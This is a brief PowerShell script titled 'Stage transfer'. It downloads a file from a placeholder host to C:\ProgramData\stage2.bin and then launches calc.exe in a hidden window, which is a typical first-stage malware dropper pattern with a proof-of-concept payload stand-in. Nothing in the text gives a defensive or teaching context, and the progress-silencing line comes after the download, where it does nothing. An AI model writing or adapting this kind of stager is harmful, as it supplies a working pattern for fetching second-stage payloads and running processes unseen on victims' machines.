
<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "https://example.org/assets/update.dat",
    [string]$OutputPath = "C:\ProgramData\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $OutputPath)
Start-Process -FilePath 'calc.exe' -WindowStyle Hidden
$ProgressPreference = "SilentlyContinue"
